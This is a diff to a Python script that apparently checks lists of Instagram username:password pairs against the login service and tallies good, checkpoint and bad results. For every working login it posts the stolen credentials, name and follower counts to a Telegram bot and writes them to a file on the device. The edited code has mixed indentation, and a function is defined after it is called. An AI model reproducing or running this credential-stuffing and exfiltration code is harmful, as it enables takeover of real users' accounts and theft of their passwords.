@@ -271,8 +271,6 @@ def instagram1():
 						time.sleep(360)
 					elif 'userId' in login:
 						if WTF == "010101":
-							os.system("clear")
-							os.system("figlet Login")
 							print(45*"≈")
 							username_login = user
 							password_login = pasw
@@ -381,21 +379,15 @@ def instagram1():
 							posts = description["content"].split(",")[2].split("-")[0]
 							ouput(username,name,following,followers,posts,link_url,profile_pic)
 							def ouput(username,name,following,followers,posts,link_url,profile_pic):
-								print("\nUserName: "+username)
-								print("\nName: "+name)
-								print("\nFollowers: "+followers)
-								print("\nFollowing: "+following)
-								print("\nPosts: "+posts)
-								print()
+                                os.system("clear")
+                                print(logo2)
+                                hits+=1
+                                print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
+                                boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
+                                r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
+                                with open('/sdcard/Good.txt', 'a') as ff:
+	                                ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
 							script()
-							os.system("clear")
-							print(logo2)
-							hits+=1
-							print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-							boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
-							r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
-							with open('/sdcard/Good.txt', 'a') as ff:
-								ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
 					elif ('"message":"checkpoint_required"') in login:
 						os.system("clear")
 						print(logo2)
